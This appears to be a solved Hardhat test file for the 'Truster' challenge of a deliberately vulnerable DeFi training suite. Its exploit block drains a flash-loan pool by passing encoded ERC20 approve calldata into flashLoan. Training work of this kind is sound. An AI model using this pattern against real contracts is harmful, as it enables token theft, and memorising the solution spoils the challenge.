const { ethers } = require('hardhat');
const { expect } = require('chai');
const { Interface } = require('ethers/lib/utils');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        // Deploy Attacker contract.

        const TrusterAttacker = await ethers.getContractFactory('TrusterAttacker', attacker)
        const trusterAttacker = await TrusterAttacker.deploy(this.pool.address, this.token.address)

        const availableFlashloanAmount = await this.token.balanceOf(this.pool.address)
        console.log(await this.token.balanceOf(attacker.address))

        // generate a calldata that will make TrusterLenderPool to approve token transfer to TrusterAttacker address 
        const iface = new Interface(["function approve(address spender, uint256 amount) external returns (bool)"])
        const encodedFuntionData = iface.encodeFunctionData("approve", [trusterAttacker.address, availableFlashloanAmount])
        await this.pool.flashLoan(0, attacker.address, this.token.address, encodedFuntionData)
        await trusterAttacker.withDraw()

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

